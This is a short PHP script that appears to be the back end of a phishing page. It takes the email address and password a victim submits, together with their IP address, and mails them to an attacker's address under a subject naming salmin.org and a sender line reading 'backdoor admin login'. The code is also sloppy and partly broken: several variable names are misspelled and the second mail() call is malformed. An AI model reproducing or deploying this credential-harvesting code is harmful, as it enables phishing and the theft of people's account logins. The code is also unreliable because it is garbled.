<?php 
$ip = getenv("Remote_ADR");
$message .= " Email Adresse  : "
.$_POST['email'] . "\n"; 
$message .= " Password  : " 
.$_POST['password'] . "\n";
$send = "emailkamu";
$subject = "salmin.org $ip";
$from = "From: backdoor admin login <salmin.org>";
$from .= "-spammer\n";
mail ($send, $subject, $message, from);
mail ($message, $subject, rnessage);
?> 